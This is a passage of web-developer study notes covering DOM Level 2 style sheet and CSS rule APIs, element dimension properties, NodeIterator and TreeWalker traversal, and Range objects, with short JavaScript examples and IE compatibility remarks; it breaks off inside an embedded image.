<ul><li>This property is read/write</li></ul></li> <li><code>href</code> — The URL of the style sheet if it is included using <code>&lt;link&gt;</code> ; otherwise, this is <code>null</code></li> <li><code>media: MediaList</code> — A collection of media types supported by this style sheet<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>document.css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>screen, print<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre></div><ul><li><code>length</code>, <code>item()</code>, bracket notation</li> <li>An empty list indicates that the style sheet should be used for all media</li> <li>In IE8 and earlier, media is a string</li></ul></li> <li><code>ownerNode</code> — Pointer to the node that owns the style sheet
<ul><li>which is either a <code>&lt;link&gt;</code> or a <code>&lt;style&gt;</code> element in HTML (it can be a processing instruction in XML)</li> <li><code>null</code> if a style sheet is included in another style sheet using <code>@import</code></li> <li>IE8 and earlier do not support this property</li></ul></li> <li><code>parentStyleSheet</code> — When a style sheet is included via <code>@import</code>, this is a pointer to the style sheet that imported it</li> <li><code>title</code> — The value of the <code>title</code> attribute on the <code>ownerNode</code></li> <li><code>type</code> — A string indicating the type of style sheet. For CSS style sheets, this is <code>&quot;text/css&quot;</code></li></ul></li> <li>own properties and methods
<ul><li><code>cssRules: CSSRuleList</code> — A collection of rules contained in the style sheet
<ul><li>IE8 and earlier don’t support this property but have a comparable property called <code>rules</code></li> <li>IE9 supports both <code>cssRules</code> and <code>rules</code></li></ul></li> <li><code>ownerRule: CSSImportRule</code> — If the style sheet was included using <code>@import</code> , this is a pointer to the rule representing the import
<ul><li>otherwise, this is <code>null</code></li> <li>IE does not support this property</li></ul></li> <li><code>deleteRule(index)</code> — Deletes the rule at the given location in the <code>cssRules</code> collection
<ul><li>IE8 and earlier does not support this method, but it does have a similar method called <code>removeRule()</code></li> <li>IE9 supports both <code>deleteRule()</code> and <code>removeRule()</code></li></ul></li> <li><code>insertRule(rule, index)</code> — Inserts the given string rule at the position specified in the <code>cssRules</code> collection
<ul><li>IE8 and earlier do not support this method but have a similar method called <code>addRule()</code></li> <li>IE9 supports both <code>insertRule()</code> and <code>addRule()</code></li></ul></li></ul></li></ul></li></ol> <h5 id="css-rules"><a href="#css-rules" class="header-anchor">#</a> CSS Rules</h5> <ol><li><p>CSS Rules</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/CSSRule" target="_blank" rel="noopener noreferrer"><code>CSSRule</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleRule" target="_blank" rel="noopener noreferrer"><code>CSSStyleRule</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>CSSStyleRule.selectorText</code> <ul><li>Gets the textual representation of the selector for this rule, e.g. <code>&quot;h1,h2&quot;</code>.</li> <li>mostly read only</li></ul></li> <li><code>CSSStyleRule.style</code> <ul><li>Returns the <code>CSSStyleDeclaration</code> object for the rule.</li></ul></li> <li><code>CSSRule.cssText</code> read only
<ul><li>Represents the textual representation of the rule, e.g. <code>&quot;h1,h2 { font-size: 16pt }&quot;</code> or <code>&quot;@import 'url'&quot;</code>.</li> <li><code>CSSStyleDeclaration.cssText</code> do not contain the selector text, and can be set</li></ul></li> <li><code>CSSRule.parentRule</code> Read only
<ul><li>Returns the containing rule, otherwise <code>null</code>.</li> <li>E.g. if this rule is a style rule inside an <code>@media</code> block, the parent rule would be that <code>CSSMediaRule</code>.</li> <li>not supported by IE</li></ul></li> <li><code>CSSRule.parentStyleSheet</code> Read only
<ul><li>Returns the <code>CSSStyleSheet</code> object for the style sheet that contains this rule</li></ul></li> <li><code>CSSRule.type</code> Read only
<ul><li>One of the Type constants indicating the type of CSS rule.</li></ul></li></ul></li> <li><p>Creating Rules: see before <code>CSSStyleSheet.insertRule()</code></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>sheet<span class="token punctuation">.</span><span class="token function">insertRule</span><span class="token punctuation">(</span><span class="token string">&quot;body { background-color: silver }&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>see also: Dynamic Styles</p></li> <li><p>Deleting Rules: see before <code>CSSStyleSheet.deleteRule()</code></p></li></ol> <h4 id="element-dimensions-not-dom-2-but-cssom"><a href="#element-dimensions-not-dom-2-but-cssom" class="header-anchor">#</a> Element Dimensions (not DOM 2 but CSSOM)</h4> <p>CSS Object Model (CSSOM) View Module: WD Working Draft</p> <ol><li><p>rounded result</p> <ul><li>If you need a fractional value, use <code>element.getBoundingClientRect()</code></li></ul></li> <li><p>Offset Dimensions</p> <ul><li>which incorporate all of the visual space that an element takes up on the screen, made up of height and width, including all padding, scrollbars, and borders (but not including margins and those of pseudo elements)</li> <li>calculated each time as they are accessed???</li> <li><code>HTMLElement.offsetHeight</code> Read only<br> <img src="/notes-of-tan/assets/img/1.87338ab8.png" alt=""> <img src="/notes-of-tan/assets/img/2.8d20c9a8.png" alt=""> <ul><li>Returns a number containing the height of an element, relative to the layout</li></ul></li> <li><code>HTMLElement.offsetLeft</code> Read only
<ul><li>Returns a double, the distance from this element's left border to its <code>offsetParent</code>'s left border</li></ul></li> <li><code>HTMLElement.offsetParent</code> Read only
<ul><li>Returns a <code>Element</code> that is the element from which all offset calculations are currently computed</li></ul></li> <li><code>HTMLElement.offsetTop</code> Read only
<ul><li>Returns a double, the distance from this element's top border to its <code>offsetParent</code>'s top border</li></ul></li> <li><code>HTMLElement.offsetWidth</code> Read only
<ul><li>Returns a double containing the width of an element, relative to the layout</li></ul></li></ul></li> <li><p>Client Dimensions</p> <ul><li>comprise the space occupied by the element’s content and its padding<br> <img src="/notes-of-tan/assets/img/3.6b47f950.png" alt=""> <ul><li>the space taken up by scrollbars is not counted</li></ul></li> <li>are read-only and are calculated each time they are accessed</li> <li><code>Element.clientWidth</code></li> <li><code>Element.clientHeight</code></li></ul></li> <li><p>Scroll Dimensions</p> <ul><li>scroll elements
<ul><li>Some elements, such as the <code>&lt;html&gt;</code> element, scroll automatically</li> <li>whereas other elements can be made to scroll by using the CSS <code>overflow</code> property</li> <li><code>Element.scrollHeight</code> (read only) — The total height of the content without scrollbars
<ul><li>If the element's content can fit without a need for vertical scrollbar, its <code>scrollHeight</code> is equal to <code>clientHeight</code></li></ul></li> <li><code>Element.scrollWidth</code> (read only) — The total width of the content without scrollbars
<ul><li>equal to <code>clientWidth</code> if no scrollbar present</li></ul></li> <li><code>Element.scrollTop</code> — The number of pixels that are hidden in the top of the content area
<ul><li>This property can be set to change the scroll position of the element</li> <li>If set to a value greater than the maximum available, settles to maximum</li></ul></li> <li><code>Element.scrollLeft</code> — The number of pixels that are hidden to the left of the content area
<ul><li>This property can be set to change the scroll position of the element</li> <li>If set to a value greater than the maximum available, settles to maximum</li></ul></li></ul></li></ul></li> <li><p>Determining Element Dimensions — <code>Element.getBoundingClientRect(): ClientRect | DOMRect</code></p> <ul><li>IE and Edge return a non-standard <code>ClientRect</code> object (<a href="http://msdn.microsoft.com/en-us/library/hh826029(VS.85).aspx" target="_blank" rel="noopener noreferrer">MSDN: ClientRect<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>) which does not have the <code>x</code> and <code>y</code> properties found in standard <code>DOMRect</code> objects</li> <li><code>DOMRect</code> inherits properties from its parent, <code>DOMRectReadOnly.</code> The difference is that they are not read-only anymore
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMRect" target="_blank" rel="noopener noreferrer">properties<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <ul><li><code>left</code>, <code>top</code>, <code>right</code>, <code>bottom</code>, <code>x</code>, <code>y</code>, <code>width</code>, and <code>height</code></li> <li>Properties other than <code>width</code> and <code>height</code> are coordinates</li> <li>IE8 and earlier consider the upper-left corner of the document to be located at (2,2) instead of (0,0)</li> <li>Generally, the difference between the <code>right</code> and the <code>left</code> properties is equivalent to <code>offsetWidth</code>, and the difference between the <code>bottom</code> and the <code>top</code> properties is equivalent to <code>offsetHeight</code></li></ul></li> <li>can be modified in modern browsers, older versions which effectively returned <code>DOMRectReadOnly</code></li> <li>Due to compatibility problems (see below), it is safest to rely on only properties <code>left</code>, <code>top</code>, <code>right</code>, and <code>bottom</code></li></ul></li></ul></li></ol> <h4 id="traversal"><a href="#traversal" class="header-anchor">#</a> Traversal</h4> <ol><li><p>conformance</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> supportsTraversals <span class="token operator">=</span> document<span class="token punctuation">.</span>implementation<span class="token punctuation">.</span><span class="token function">hasFeature</span><span class="token punctuation">(</span><span class="token string">&quot;Traversal&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2.0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> supportsNodeIterator <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> document<span class="token punctuation">.</span>createNodeIterator <span class="token operator">==</span> <span class="token string">&quot;function&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> supportsTreeWalker <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> document<span class="token punctuation">.</span>createTreeWalker <span class="token operator">==</span> <span class="token string">&quot;function&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>IE9+</li> <li>depth-first traversal</li> <li>From the very last text node at the end of the document, the traversal can be reversed to go back up the tree</li></ul></li> <li><p><code>NodeIterator</code></p> <ul><li>create: <code>document.createNodeIterator(root: Node, whatToShow?, filter?, entityReferenceExpansion?): NodeIterator</code> <ul><li>whatToShow — A numerical code indicating which nodes should be visited
<ul><li>default: <code>NodeFilter.SHOW_ALL</code>: -1 (<code>0xffffffff</code>)</li> <li>in common use: <code>NodeFilter.SHOW_ELEMENT</code></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/NodeIterator/whatToShow" target="_blank" rel="noopener noreferrer">list<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li>filter — A <code>NodeFilter</code> object or a function indicating whether a particular node should be accepted or rejected<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> filter <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token function-variable function">acceptNode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">node</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> node<span class="token punctuation">.</span>tagName<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;p&quot;</span> <span class="token operator">?</span>
        NodeFilter<span class="token punctuation">.</span><span class="token constant">FILTER_ACCEPT</span> <span class="token operator">:</span>
        NodeFilter<span class="token punctuation">.</span><span class="token constant">FILTER_SKIP</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div>A <code>NodeFilter</code> object has only one method, <code>acceptNode(node)</code>, which returns
<ul><li><code>FILTER_ACCEPT</code></li> <li><code>FILTER_REJECT</code>: For <code>TreeWalker</code>, child nodes are also rejected, otherwise synonymous to <code>FILTER_SKIP</code></li> <li><code>FILTER_SKIP</code></li></ul></li> <li>(deprecated) entityReferenceExpansion — A Boolean value indicating whether entity references should be expanded. This has no effect in HTML pages, because entity references are never expanded</li></ul></li> <li>methods
<ul><li><code>NodeIterator.previousNode()</code> <ul><li>Returns the previous <code>Node</code> in the document, or <code>null</code> if there are none</li></ul></li> <li><code>NodeIterator.nextNode()</code> <ul><li>Returns the <code>next</code> Node in the document, or <code>null</code> if there are none</li> <li>the first call returns the root</li></ul></li></ul></li> <li>properties: read only
<ul><li>arguments</li> <li><code>root</code></li> <li><code>NodeIterator.referenceNode</code> <ul><li>no IE support</li></ul></li> <li><code>NodeIterator.pointerBeforeReferenceNode</code> <ul><li>no IE support</li></ul></li></ul></li></ul></li> <li><p><code>TreeWalker</code></p> <ul><li>more advanced version of <code>NodeIterator</code></li> <li>create: <code>document.createTreeWalker()</code> <ul><li>similar to the <code>NodeIterator</code> one, with minimal differences
<ul><li><code>FILTER_REJECT</code>: For <code>TreeWalker</code>, child nodes are also rejected, otherwise synonymous to <code>FILTER_SKIP</code></li></ul></li></ul></li> <li>methods
<ul><li><code>nextNode()</code> and <code>previousNode()</code></li> <li><code>parentNode()</code> — Travels to the current node’s parent</li> <li><code>firstChild()</code> — Travels to the first child of the current node</li> <li><code>lastChild()</code> — Travels to the last child of the current node</li> <li><code>nextSibling()</code> — Travels to the next sibling of the current node</li> <li><code>previousSibling()</code> — Travels to the previous sibling of the current node</li></ul></li> <li>properties
<ul><li>arguments in creation function</li> <li><code>TreeWalker.currentNode: Node</code></li> <li>can also be set to change where the traversal continues from when it resumes</li></ul></li></ul></li></ol> <h4 id="ranges"><a href="#ranges" class="header-anchor">#</a> Ranges</h4> <ol><li><p>conformance</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> supportsRange <span class="token operator">=</span> document<span class="token punctuation">.</span>implementation<span class="token punctuation">.</span><span class="token function">hasFeature</span><span class="token punctuation">(</span><span class="token string">&quot;Range&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2.0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> alsoSupportsRange <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> document<span class="token punctuation">.</span>createRange <span class="token operator">==</span> <span class="token string">&quot;function&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>not IE8 and earlier</p></li> <li><p>create</p> <ul><li><code>document.createRange(): Range</code> <ul><li>tied directly to the document on which it was created and cannot be used on other documents</li></ul></li> <li><code>Range()</code> constructor
<ul><li>no IE support</li></ul></li></ul></li> <li><p>Properties of <code>Range</code></p> <ul><li>These properties are filled when the range is placed into a specific position in the document</li> <li><code>Range.collapsed</code> Read only
<ul><li>Returns a Boolean indicating whether the range's start and end points are at the same position.</li></ul></li> <li><code>Range.commonAncestorContainer</code> Read only
<ul><li>Returns the deepest <code>Node</code> that contains the <code>startContainer</code> and <code>endContainer</code> nodes.</li></ul></li> <li><code>Range.endContainer</code> Read only
<ul><li>Returns the <code>Node</code> within which the <code>Range</code> ends. (the parent of the last node in the selection)</li></ul></li> <li><code>Range.endOffset</code> Read only
<ul><li>Returns a number representing where in the endContainer the Range ends.
<ul><li>what the number points is not in the range</li></ul></li> <li>follows the same rules as <code>startOffset</code></li></ul></li> <li><code>Range.startContainer</code> Read only
<ul><li>Returns the <code>Node</code> within which the <code>Range</code> starts. (the parent of the first node in the selection)</li></ul></li> <li><code>Range.startOffset</code> Read only
<ul><li>Returns a number representing where in the <code>startContainer</code> the <code>Range</code> starts.</li> <li>number of characters skipped before the range starts</li> <li>or the index of the first child node in the range</li> <li>remember DOM-compliant browsers count white space as text nodes</li></ul></li></ul></li> <li><p>Selection</p> <ul><li>select node
<img src="data:image/png;base64,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